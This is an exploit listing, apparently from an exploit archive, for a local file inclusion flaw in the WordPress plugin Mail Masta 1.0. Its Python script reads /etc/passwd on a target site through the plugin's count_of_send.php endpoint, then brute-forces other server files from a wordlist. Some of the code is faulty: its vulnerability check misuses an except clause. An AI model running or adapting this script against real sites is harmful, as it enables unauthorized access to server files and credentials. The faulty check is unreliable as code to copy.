# Exploit Title: WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)
# Date: 2021-08-24
# Exploit Author: Matheus Alexandre [Xcatolin]
# Software Link: https://downloads.wordpress.org/plugin/mail-masta.zip
# Version: 1.0

WordPress Plugin Mail Masta is prone to a local file inclusion vulnerability because it fails to sufficiently verify user-supplied input.

* Make sure to modify the wordlist path to your preferred wordlist. You can also download the one i used at Github:
https://github.com/Xcatolin/Personal-Exploits/

#!/usr/bin/python

# Exploit for the Wordpress plugin mail-masta 1.0 LFI vulnerability

import requests
from requests.exceptions import ConnectionError

class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    ITALIC   = '\33[3m'

print(bcolors.BOLD + """\
                 __  __      _ _     __  __         _
                |  \/  |__ _(_) |___|  \/  |__ _ __| |_ __ _
                | |\/| / _` | | |___| |\/| / _` (_-<  _/ _` |
                |_|  |_\__,_|_|_|   |_|  |_\__,_/__/\__\__,_|
  _                 _   ___ _ _       ___         _         _
 | |   ___  __ __ _| | | __(_) |___  |_ _|_ _  __| |_  _ __(_)___ _ _
 | |__/ _ \/ _/ _` | | | _|| | / -_)  | || ' \/ _| | || (_-< / _ \ ' \
 |____\___/\__\__,_|_| |_| |_|_\___| |___|_||_\__|_|\_,_/__/_\___/_||_|


					|_   .  \_/ _ _ |_ _ |. _
					|_)\/.  / \(_(_||_(_)||| )
					   /
     """ + bcolors.ENDC)

endpoint = "/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl="
valid = "/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"


print (bcolors.WARNING + "[+] Insert the target including the WordPress instance:" + bcolors.ENDC)
print (bcolors.ITALIC + "ex: http://target.com/wordpress\n" + bcolors.ENDC)
target = raw_input("~# ")

print (bcolors.WARNING + "[*] Checking if the target is alive..." + bcolors.ENDC)
try:
	request = requests.get(target)
except ConnectionError:
	print (bcolors.FAIL + "[X] Target not available. Please check the URL you've entered." + bcolors.ENDC)
	exit(1)
else:
	print (bcolors.OKGREEN + "[!] Target up and running!\n" + bcolors.ENDC)

print (bcolors.WARNING + "[*] Checking if the Mail-Masta endpoint is vulnerable..." + bcolors.ENDC)
try:
	response = requests.get(target + valid)
except len(response.content) < 1000 :
	print (bcolors.FAIL + "[X] Endpoint not vulnerable." + bcolors.ENDC)
	exit(1)
else:
	print (bcolors.OKGREEN + "[!] Endpoint vulnerable!\n" + bcolors.ENDC)

print (bcolors.WARNING + "[*] Fuzzing for files in the system..." + bcolors.ENDC)
wordlist='wordlist.txt' ## Change here
lines=open(wordlist, "r").readlines()

for i in range(0, len(lines)):
	word=lines[i].replace("\n","")
	response = requests.get(target + endpoint + word)
	if len(response.content) > 500 :
		print (bcolors.OKGREEN + "[!] " + bcolors.ENDC) + "File",word,"found!"